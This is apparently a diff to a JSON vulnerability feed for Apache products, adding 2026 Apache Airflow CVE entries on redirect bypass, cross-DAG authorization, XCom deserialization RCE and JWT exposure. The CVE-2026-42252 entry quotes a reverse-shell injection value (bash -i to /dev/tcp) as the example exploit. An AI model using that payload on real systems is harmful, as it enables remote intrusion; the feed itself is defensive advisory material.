@@ -1,7 +1,7 @@
 {
-  "generated_at": "2026-06-03T23:44:59+00:00",
+  "generated_at": "2026-06-04T01:32:31+00:00",
   "vendor": "apache_software_foundation",
-  "count": 699,
+  "count": 705,
   "items": [
     {
       "cve_id": "CVE-2022-22719",
@@ -30015,14 +30015,14 @@
       "active_threat": false,
       "probability_score": 0.00038,
       "nvd": {
-        "cvss_v3_score": null,
-        "cvss_v3_severity": null,
+        "cvss_v3_score": 8.5,
+        "cvss_v3_severity": "HIGH",
         "cvss_v2_score": null,
         "cvss_v2_severity": null,
         "cwe_ids": [
           "CWE-297"
         ],
-        "cpe_count": 0,
+        "cpe_count": 1,
         "reference_count": 2
       }
     },
@@ -30891,6 +30891,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-40961",
+      "description": "A bug in the login redirect route in Apache Airflow allowed authenticated users to craft URLs that bypassed the `is_safe_url` check, enabling redirection from a trusted Airflow domain to an attacker-controlled origin. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. As a defense-in-depth mitigation, deployment operators can place Airflow behind a reverse proxy that strips off-domain `next=` query parameters before they reach the login endpoint.",
+      "cvss_score": 7.2,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache airflow",
+          "versions": [
+            {
+              "lessThan": "3.2.2",
+              "status": "affected",
+              "version": "3.0.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache airflow",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00085,
+      "nvd": {
+        "cvss_v3_score": 7.2,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-601"
+        ],
+        "cpe_count": 1,
+        "reference_count": 3
+      }
+    },
+    {
       "cve_id": "CVE-2026-41044",
       "description": "Improper Input Validation, Improper Control of Generation of Code ('Code Injection') vulnerability in Apache ActiveMQ, Apache ActiveMQ Broker, Apache ActiveMQ All.\n\nAn authenticated attacker can use the admin web console page to construct a malicious broker name that bypasses name validation to include an xbean binding that can be later used by a VM transport to load a remote Spring XML application.\nThe attacker can then use the DestinationView mbean to send a message to trigger a VM transport creation that will reference this malicious broker name which can lead to loading the malicious Spring XML context file.\n\n\nBecause Spring's ResourceXmlApplicationContext instantiates all singleton beans before the BrokerService validates the configuration, arbitrary code execution occurs on the broker's JVM through bean factory methods such as Runtime.exec().\n\nThis issue affects Apache ActiveMQ: before 5.19.6, from 6.0.0 before 6.2.5; Apache ActiveMQ Broker: before 5.19.6, from 6.0.0 before 6.2.5; Apache ActiveMQ All: before 5.19.6, from 6.0.0 before 6.2.5.\n\nUsers are recommended to upgrade to version 6.2.5 or 5.19.6, which fixes the issue.",
       "cvss_score": 8.8,
@@ -30976,6 +31019,49 @@
         ],
         "cpe_count": 4,
         "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-41084",
+      "description": "A bug in Apache Airflow's bulk Task Instances API (`PATCH/DELETE /api/v2/dags/{dag_id}/dagRuns/{dag_run_id}/taskInstances`) evaluated authorization against the `dag_id` resolved from the URL path while operating on the `dag_id` / `dag_run_id` extracted from request-body entity fields. An authenticated UI/API user with edit permission on one Dag could mutate Task Instance state in any other Dag by keeping the authorized Dag's ID in the URL path and naming the target Dag's IDs in the request body entities. Affects deployments that rely on per-Dag edit-scope to keep Task Instance state isolated between teams. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.",
+      "cvss_score": 7.5,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache airflow",
+          "versions": [
+            {
+              "lessThan": "3.2.2",
+              "status": "affected",
+              "version": "3.2.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache airflow",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00061,
+      "nvd": {
+        "cvss_v3_score": 7.5,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-639"
+        ],
+        "cpe_count": 1,
+        "reference_count": 3
       }
     },
     {
@@ -31577,6 +31663,92 @@
         ],
         "cpe_count": 3,
         "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-42252",
+      "description": "Apache Airflow's official documentation at `core-concepts/dag-run.html` (\"Passing Parameters when triggering Dags\") showed a verbatim `BashOperator(bash_command=\"echo value: {{ dag_run.conf['conf1'] }}\")` example without any quoting / sanitization warning. Dag authors who copied the pattern verbatim into deployments where users had `Dag.can_trigger` permission on the affected Dag (typical multi-team deployments, hosted offerings exposing a trigger API) could be exposed to shell-metacharacter injection via the `conf` field of the trigger API: an authenticated trigger user could supply `\"; bash -i >& /dev/tcp/.../9999 0>&1; #\"` as a `conf` value and reach an `os.exec` on the worker. This CVE covers the documentation correction in `apache/airflow` PR 64129 \u2014 the pattern in the docs example now includes explicit shell-quoting and a safety caveat. Affects deployments whose Dag code was modeled on the pre-correction docs example. Same class as the prior CVE-2025-50213 and CVE-2025-27018 documentation-pattern fixes. Users are advised to upgrade to `apache-airflow` 3.2.2 or later to pick up the corrected documentation shipped with the release.",
+      "cvss_score": 9.1,
+      "cvss_severity": "CRITICAL",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache airflow",
+          "versions": [
+            {
+              "lessThan": "3.2.2",
+              "status": "affected",
+              "version": "3.0.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache airflow",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00051,
+      "nvd": {
+        "cvss_v3_score": 9.1,
+        "cvss_v3_severity": "CRITICAL",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-1336"
+        ],
+        "cpe_count": 1,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-42359",
+      "description": "A bug in Apache Airflow's XCom PATCH endpoint `PATCH /api/v2/xcomEntries/{key}` allowed an authenticated UI/API user with XCom write permission on a Dag to set XCom entries under reserved key names (e.g. `return_value`) that the matching POST endpoint already validated against `FORBIDDEN_XCOM_KEYS`. The endpoint also accepted serialized payload shapes the triggerer's deserializer treats as code; combined, this allowed RCE on the triggerer when the affected task next deferred. Affects deployments where untrusted users have XCom write permission on Dags that defer to the triggerer. This is a fix-bypass of CVE-2026-33858: PR #64148 added the `FORBIDDEN_XCOM_KEYS` validator only on the POST/set path; the PATCH path was not covered. Users who already upgraded for CVE-2026-33858 should additionally upgrade to `apache-airflow` 3.2.2 or later to cover the PATCH-path bypass.",
+      "cvss_score": 8.8,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache airflow",
+          "versions": [
+            {
+              "lessThan": "3.2.2",
+              "status": "affected",
+              "version": "3.2.0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache airflow",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.00062,
+      "nvd": {
+        "cvss_v3_score": 8.8,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-502"
+        ],
+        "cpe_count": 1,
+        "reference_count": 3
       }
     },
     {
@@ -32723,6 +32895,49 @@
       }
     },
     {
+      "cve_id": "CVE-2026-45360",
+      "description": "Apache Airflow's scheduler-side deadline-reference decoder (`SerializedCustomReference.deserialize_reference`) imported and dispatched arbitrary class paths drawn from DAG-author-controlled serialized state without an allowlist or plugin-registry gate. A DAG author whose code reaches the scheduler \u2014 the default on single-host deployments where the DAG bundle is importable from the scheduler process \u2014 could embed a custom `DeadlineReference` whose serialized form named an attacker-controlled module path, causing the scheduler to `import_string(...)` and instantiate that class with a live SQLAlchemy session attached. Affects deployments where DAG-author code is less trusted than the scheduler process. Users are advised to upgrade to `apache-airflow` 3.2.2 or later.",
+      "cvss_score": 7.3,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache airflow",
+          "versions": [
+            {
+              "lessThan": "3.2.2",
+              "status": "affected",
+              "version": "0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache airflow",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.0006,
+      "nvd": {
+        "cvss_v3_score": 7.3,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-502"
+        ],
+        "cpe_count": 1,
+        "reference_count": 3
+      }
+    },
+    {
       "cve_id": "CVE-2026-45361",
       "description": "Apache Airflow providers-google's `ComputeEngineSSHHook` disables SSH host-key verification by default, exposing SSH traffic between an Airflow worker and a Compute Engine VM to in-path network attackers who can intercept or modify the session. Users are advised to upgrade to `apache-airflow-providers-google` 22.0.0 or later.",
       "cvss_score": 8.1,
@@ -33183,6 +33398,49 @@
           "CWE-276"
         ],
         "cpe_count": 2,
+        "reference_count": 2
+      }
+    },
+    {
+      "cve_id": "CVE-2026-49298",
+      "description": "A bug in Apache Airflow's KubernetesExecutor caused JWT tokens used by worker pods to authenticate against the Execution API to be passed to the worker container as command-line arguments visible in the pod spec. An authenticated UI/API user with Kubernetes read-only access to the cluster (e.g. `pods/get` in the Airflow namespace) could harvest the JWT from `kubectl describe pod` output and then call state-mutating Execution API endpoints \u2014 triggering Dag runs, clearing runs, reading or writing Variables / Connections / XComs \u2014 as if they were a running task. Affects deployments using the `KubernetesExecutor`. Users are advised to upgrade to `apache-airflow` 3.2.2 or later. This is the airflow-core half of the same vulnerability addressed by [CVE-2026-27173](https://www.cve.org/CVERecord?id=CVE-2026-27173), which shipped the apache-airflow-providers-cncf-kubernetes side of the fix. Deployments that already upgraded `apache-airflow-providers-cncf-kubernetes` to 10.17.0 or later per the CVE-2026-27173 advisory should additionally upgrade `apache-airflow` to 3.2.2 or later to close the core-side surface \u2014 the two fixes are complementary, not duplicates.",
+      "cvss_score": 8.8,
+      "cvss_severity": "HIGH",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "affected": [
+        {
+          "vendor": "apache software foundation",
+          "product": "apache airflow",
+          "versions": [
+            {
+              "lessThan": "3.2.2",
+              "status": "affected",
+              "version": "0",
+              "versionType": "semver"
+            }
+          ]
+        }
+      ],
+      "watchlist_hit": true,
+      "in_watchlist": true,
+      "in_patchthis": false,
+      "is_critical": false,
+      "priority_label": "",
+      "matched_terms": [
+        "product:apache airflow",
+        "vendor:apache software foundation"
+      ],
+      "active_threat": false,
+      "probability_score": 0.0005,
+      "nvd": {
+        "cvss_v3_score": 8.8,
+        "cvss_v3_severity": "HIGH",
+        "cvss_v2_score": null,
+        "cvss_v2_severity": null,
+        "cwe_ids": [
+          "CWE-538"
+        ],
+        "cpe_count": 1,
         "reference_count": 2
       }
     },
